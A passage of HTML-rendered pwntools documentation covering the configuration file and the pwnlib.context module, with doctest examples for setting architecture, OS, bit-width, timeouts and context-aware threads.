when used in library mode (<code class="docutils literal"><span class="pre">import</span> <span class="pre">pwnlib</span></code>).  To read the configuration
file in library mode, invoke <code class="xref py py-func docutils literal"><span class="pre">config.initialize()</span></code>.</p>
<p>The <code class="docutils literal"><span class="pre">context</span></code> section supports complex types, at least as far as is
supported by <code class="docutils literal"><span class="pre">pwnlib.util.safeeval.expr</span></code>.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>[log]
success.symbol=😎
error.symbol=☠
info.color=blue

[context]
adb_port=4141
randomize=1
timeout=60
terminal=[&#39;x-terminal-emulator&#39;, &#39;-e&#39;]
</pre></div>
</div>
</div>
<span id="document-context"></span><div class="section" id="pwnlib-context-setting-runtime-variables">
<h3><a class="reference internal" href="#module-pwnlib.context" title="pwnlib.context"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.context</span></code></a> &#8212; Setting runtime variables<a class="headerlink" href="#pwnlib-context-setting-runtime-variables" title="Permalink to this headline">¶</a></h3>
<p>Many settings in <code class="docutils literal"><span class="pre">pwntools</span></code> are controlled via the global variable :data:<a href="#id1"><span class="problematic" id="id2">`</span></a>.context, such as the selected target operating system, architecture, and bit-width.</p>
<p>In general, exploits will start with something like:</p>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</pre></div>
</div>
<p>Which sets up everything in the exploit for exploiting a 64-bit Intel binary.</p>
<p>The recommended method is to use <code class="docutils literal"><span class="pre">context.binary</span></code>  to automagically set all of the appropriate values.</p>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s1">&#39;./challenge-binary&#39;</span>
</pre></div>
</div>
<div class="section" id="module-pwnlib.context">
<span id="module-members"></span><h4>Module Members<a class="headerlink" href="#module-pwnlib.context" title="Permalink to this headline">¶</a></h4>
<p>Implements context management so that nested/scoped contexts and threaded
contexts work properly and as expected.</p>
<dl class="class">
<dt id="pwnlib.context.ContextType">
<em class="property">class </em><code class="descclassname">pwnlib.context.</code><code class="descname">ContextType</code><span class="sig-paren">(</span><em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType" title="Permalink to this definition">¶</a></dt>
<dd><p>Class for specifying information about the target machine.
Intended for use as a pseudo-singleton through the global
variable <a class="reference internal" href="#pwnlib.context.context" title="pwnlib.context.context"><code class="xref py py-data docutils literal"><span class="pre">context</span></code></a>, available via
<code class="docutils literal"><span class="pre">from</span> <span class="pre">pwn</span> <span class="pre">import</span> <span class="pre">*</span></code> as <code class="docutils literal"><span class="pre">context</span></code>.</p>
<p>The context is usually specified at the top of the Python file for clarity.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>Currently supported properties and their defaults are listed below.
The defaults are inherited from <a class="reference internal" href="#pwnlib.context.ContextType.defaults" title="pwnlib.context.ContextType.defaults"><code class="xref py py-data docutils literal"><span class="pre">pwnlib.context.ContextType.defaults</span></code></a>.</p>
<p>Additionally, the context is thread-aware when using
<a class="reference internal" href="#pwnlib.context.Thread" title="pwnlib.context.Thread"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.context.Thread</span></code></a> instead of <a class="reference external" href="https://docs.python.org/2.7/library/threading.html#threading.Thread" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">threading.Thread</span></code></a>
(all internal <code class="docutils literal"><span class="pre">pwntools</span></code> threads use the former).</p>
<p>The context is also scope-aware by using the <code class="docutils literal"><span class="pre">with</span></code> keyword.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span> 
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">==</span> <span class="s1">&#39;linux&#39;</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;arm&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">vars</span><span class="p">(</span><span class="n">context</span><span class="p">)</span> <span class="o">==</span> <span class="p">{</span><span class="s1">&#39;arch&#39;</span><span class="p">:</span> <span class="s1">&#39;arm&#39;</span><span class="p">,</span> <span class="s1">&#39;bits&#39;</span><span class="p">:</span> <span class="mi">32</span><span class="p">,</span> <span class="s1">&#39;endian&#39;</span><span class="p">:</span> <span class="s1">&#39;little&#39;</span><span class="p">,</span> <span class="s1">&#39;os&#39;</span><span class="p">:</span> <span class="s1">&#39;linux&#39;</span><span class="p">}</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">endian</span>
<span class="go">&#39;little&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">bits</span>
<span class="go">32</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">nop</span><span class="p">():</span>
<span class="gp">... </span>  <span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">asm</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;nop&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">nop</span><span class="p">()</span>
<span class="go">00f020e3</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">):</span>
<span class="gp">... </span>  <span class="n">nop</span><span class="p">()</span>
<span class="go">90</span>
<span class="gp">&gt;&gt;&gt; </span><span class="kn">from</span> <span class="nn">pwnlib.context</span> <span class="k">import</span> <span class="n">Thread</span> <span class="k">as</span> <span class="n">PwnThread</span>
<span class="gp">&gt;&gt;&gt; </span><span class="kn">from</span> <span class="nn">threading</span>      <span class="k">import</span> <span class="n">Thread</span> <span class="k">as</span> <span class="n">NormalThread</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;mips&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="n">pwnthread</span> <span class="o">=</span> <span class="n">PwnThread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">nop</span><span class="p">)</span>
<span class="gp">... </span>    <span class="n">thread</span>    <span class="o">=</span> <span class="n">NormalThread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">nop</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># Normal thread uses the default value for arch, &#39;i386&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="p">(</span><span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">(),</span> <span class="n">thread</span><span class="o">.</span><span class="n">join</span><span class="p">())</span>
<span class="go">90</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># Pwnthread uses the correct context from creation-time</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="p">(</span><span class="n">pwnthread</span><span class="o">.</span><span class="n">start</span><span class="p">(),</span> <span class="n">pwnthread</span><span class="o">.</span><span class="n">join</span><span class="p">())</span>
<span class="go">00000000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">nop</span><span class="p">()</span>
<span class="go">00f020e3</span>
</pre></div>
</div>
<p>Initialize the ContextType structure.</p>
<p>All keyword arguments are passed to <a class="reference internal" href="#pwnlib.context.ContextType.update" title="pwnlib.context.ContextType.update"><code class="xref py py-func docutils literal"><span class="pre">update()</span></code></a>.</p>
<dl class="class">
<dt id="pwnlib.context.ContextType.Thread">
<em class="property">class </em><code class="descname">Thread</code><span class="sig-paren">(</span><em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.Thread" title="Permalink to this definition">¶</a></dt>
<dd><p>Instantiates a context-aware thread, which inherit its context when it is
instantiated. The class can be accessed both on the context module as
<cite>pwnlib.context.Thread</cite> and on the context singleton object inside the
context module as <cite>pwnlib.context.context.Thread</cite>.</p>
<p>Threads created by using the native :class`threading`.Thread` will have a
clean (default) context.</p>
<p>Regardless of the mechanism used to create any thread, the context
is de-coupled from the parent thread, so changes do not cascade
to child or parent.</p>
<p>Saves a copy of the context when instantiated (at <code class="docutils literal"><span class="pre">__init__</span></code>)
and updates the new thread&#8217;s context before passing control
to the user code via <code class="docutils literal"><span class="pre">run</span></code> or <code class="docutils literal"><span class="pre">target=</span></code>.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;arm&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">p</span><span class="p">():</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">context</span><span class="o">.</span><span class="n">arch</span>
<span class="gp">... </span>    <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;mips&#39;</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">context</span><span class="o">.</span><span class="n">arch</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># Note that a normal Thread starts with a clean context</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># (i386 is the default architecture)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">p</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">(),</span> <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">())</span>
<span class="go">i386</span>
<span class="go">mips</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># Note that the main Thread&#39;s context is unchanged</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">context</span><span class="o">.</span><span class="n">arch</span>
<span class="go">arm</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># Note that a context-aware Thread receives a copy of the context</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">p</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">(),</span> <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">())</span>
<span class="go">arm</span>
<span class="go">mips</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># Again, the main thread is unchanged</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">context</span><span class="o">.</span><span class="n">arch</span>
<span class="go">arm</span>
</pre></div>
</div>
<p>Implementation Details:</p>
<blockquote>
<div><p>This class implemented by hooking the private function
<code class="xref py py-func docutils literal"><span class="pre">threading.Thread._Thread_bootstrap()</span></code>, which is called before
passing control to <code class="xref py py-func docutils literal"><span class="pre">threading.Thread.run()</span></code>.</p>
<p>This could be done by overriding <code class="docutils literal"><span class="pre">run</span></code> itself, but we would have to
ensure that all uses of the class would only ever use the keyword
<code class="docutils literal"><span class="pre">target=</span></code> for <code class="docutils literal"><span class="pre">__init__</span></code>, or that all subclasses invoke
<code class="docutils literal"><span class="pre">super(Subclass.self).set_up_context()</span></code> or similar.</p>
</div></blockquote>
</dd></dl>

<dl class="method">
<dt id="pwnlib.context.ContextType.clear">
<code class="descclassname">ContextType.</code><code class="descname">clear</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py#L563-589"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.clear" title="Permalink to this definition">¶</a></dt>
<dd><p>Clears the contents of the context.
All values are set to their defaults.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>a</strong> &#8211; Arguments passed to <code class="docutils literal"><span class="pre">update</span></code></li>
<li><strong>kw</strong> &#8211; Arguments passed to <code class="docutils literal"><span class="pre">update</span></code></li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="c1"># Default value</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">==</span> <span class="s1">&#39;i386&#39;</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;arm&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">==</span> <span class="s1">&#39;i386&#39;</span>
<span class="go">False</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">==</span> <span class="s1">&#39;i386&#39;</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.context.ContextType.copy">
<code class="descclassname">ContextType.</code><code class="descname">copy</code><span class="sig-paren">(</span><span class="sig-paren">)</span> &#x2192; dict<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py#L425-436"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.copy" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns a copy of the current context as a dictionary.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">os</span>   <span class="o">=</span> <span class="s1">&#39;linux&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">vars</span><span class="p">(</span><span class="n">context</span><span class="p">)</span> <span class="o">==</span> <span class="p">{</span><span class="s1">&#39;os&#39;</span><span class="p">:</span> <span class="s1">&#39;linux&#39;</span><span class="p">}</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.context.ContextType.local">
<code class="descclassname">ContextType.</code><code class="descname">local</code><span class="sig-paren">(</span><em>**kwargs</em><span class="sig-paren">)</span> &#x2192; context manager<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py#L482-528"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.local" title="Permalink to this definition">¶</a></dt>
<dd><p>Create a context manager for use with the <code class="docutils literal"><span class="pre">with</span></code> statement.</p>
<p>For more information, see the example below or PEP 343.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>kwargs</strong> &#8211; Variables to be assigned in the new environment.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">ContextType manager for managing the old and new environment.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">timeout</span> <span class="o">==</span> <span class="mi">1</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">context</span><span class="o">.</span><span class="n">timeout</span>
<span class="go">1.0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">2</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">context</span><span class="o">.</span><span class="n">timeout</span>
<span class="gp">... </span>    <span class="n">context</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">3</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">context</span><span class="o">.</span><span class="n">timeout</span>
<span class="go">2.0</span>
<span class="go">3.0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">context</span><span class="o">.</span><span class="n">timeout</span>
<span class="go">1.0</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.context.ContextType.quietfunc">
<code class="descclassname">ContextType.</code><code class="descname">quietfunc</code><span class="sig-paren">(</span><em>function</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py#L545-554"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.quietfunc" title="Permalink to this definition">¶</a></dt>
<dd><p>Similar to <a class="reference internal" href="#pwnlib.context.ContextType.quiet" title="pwnlib.context.ContextType.quiet"><code class="xref py py-attr docutils literal"><span class="pre">quiet</span></code></a>, but wraps a whole function.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.context.ContextType.reset_local">
<code class="descclassname">ContextType.</code><code class="descname">reset_local</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py#L1267-1271"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.reset_local" title="Permalink to this definition">¶</a></dt>
<dd><p>Deprecated.  Use <a class="reference internal" href="#pwnlib.context.ContextType.clear" title="pwnlib.context.ContextType.clear"><code class="xref py py-meth docutils literal"><span class="pre">clear()</span></code></a>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.context.ContextType.update">
<code class="descclassname">ContextType.</code><code class="descname">update</code><span class="sig-paren">(</span><em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py#L443-476"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.update" title="Permalink to this definition">¶</a></dt>
<dd><p>Convenience function, which is shorthand for setting multiple
variables at once.</p>
<p>It is a simple shorthand such that:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;arm&#39;</span><span class="p">,</span> <span class="o">...</span><span class="p">)</span>
</pre></div>
</div>
<p>is equivalent to:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">context</span><span class="o">.</span><span class="n">os</span>   <span class="o">=</span> <span class="s1">&#39;linux&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;arm&#39;</span>
<span class="o">...</span>
</pre></div>
</div>
<p>The following syntax is also valid:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">&#39;os&#39;</span><span class="p">:</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="s1">&#39;arch&#39;</span><span class="p">:</span> <span class="s1">&#39;arm&#39;</span><span class="p">})</span>
</pre></div>
</div>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>kwargs</strong> &#8211; Variables to be assigned in the environment.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="p">,</span> <span class="n">context</span><span class="o">.</span><span class="n">os</span>
<span class="go">(&#39;i386&#39;, &#39;linux&#39;)</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.adb">
<code class="descclassname">ContextType.</code><code class="descname">adb</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.adb" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns an argument array for connecting to adb.</p>
<p>Unless <code class="docutils literal"><span class="pre">$ADB_PATH</span></code> is set, uses the default <code class="docutils literal"><span class="pre">adb</span></code> binary in <code class="docutils literal"><span class="pre">$PATH</span></code>.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.adb_host">
<code class="descclassname">ContextType.</code><code class="descname">adb_host</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.adb_host" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets the target host which is used for ADB.</p>
<p>This is useful for Android exploitation.</p>
<p>The default value is inherited from ANDROID_ADB_SERVER_HOST, or set
to the default &#8216;localhost&#8217;.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.adb_port">
<code class="descclassname">ContextType.</code><code class="descname">adb_port</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.adb_port" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets the target port which is used for ADB.</p>
<p>This is useful for Android exploitation.</p>
<p>The default value is inherited from ANDROID_ADB_SERVER_PORT, or set
to the default 5037.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.arch">
<code class="descclassname">ContextType.</code><code class="descname">arch</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.arch" title="Permalink to this definition">¶</a></dt>
<dd><p>Target binary architecture.</p>
<p>Allowed values are listed in <a class="reference internal" href="#pwnlib.context.ContextType.architectures" title="pwnlib.context.ContextType.architectures"><code class="xref py py-attr docutils literal"><span class="pre">pwnlib.context.ContextType.architectures</span></code></a>.</p>
<p>Side Effects:</p>
<blockquote>
<div><p>If an architecture is specified which also implies additional
attributes (e.g. &#8216;amd64&#8217; implies 64-bit words, &#8216;powerpc&#8217; implies
big-endian), these attributes will be set on the context if a
user has not already set a value.</p>
<p>The following properties may be modified.</p>
<ul class="simple">
<li><a class="reference internal" href="#pwnlib.context.ContextType.bits" title="pwnlib.context.ContextType.bits"><code class="xref py py-attr docutils literal"><span class="pre">bits</span></code></a></li>
<li><a class="reference internal" href="#pwnlib.context.ContextType.endian" title="pwnlib.context.ContextType.endian"><code class="xref py py-attr docutils literal"><span class="pre">endian</span></code></a></li>
</ul>
</div></blockquote>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Raises:</th><td class="field-body"><code class="xref py py-exc docutils literal"><span class="pre">AttributeError</span></code> &#8211; An invalid architecture was specified</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">==</span> <span class="s1">&#39;i386&#39;</span> <span class="c1"># Default architecture</span>
<span class="go">True</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;mips&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">==</span> <span class="s1">&#39;mips&#39;</span>
<span class="go">True</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;doge&#39;</span> 
<span class="gt">Traceback (most recent call last):</span>
 <span class="c">...</span>
<span class="gr">AttributeError</span>: <span class="n">arch must be one of [&#39;aarch64&#39;, ..., &#39;thumb&#39;]</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;ppc&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">==</span> <span class="s1">&#39;powerpc&#39;</span> <span class="c1"># Aliased architecture</span>
<span class="go">True</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">bits</span> <span class="o">==</span> <span class="mi">32</span> <span class="c1"># Default value</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">bits</span> <span class="o">==</span> <span class="mi">64</span> <span class="c1"># New value</span>
<span class="go">True</span>
</pre></div>
</div>
<p>Note that expressly setting <a class="reference internal" href="#pwnlib.context.ContextType.bits" title="pwnlib.context.ContextType.bits"><code class="xref py py-attr docutils literal"><span class="pre">bits</span></code></a> means that we use
that value instead of the default</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">bits</span> <span class="o">=</span> <span class="mi">32</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">bits</span> <span class="o">==</span> <span class="mi">32</span>
<span class="go">True</span>
</pre></div>
</div>
<p>Setting the architecture can override the defaults for
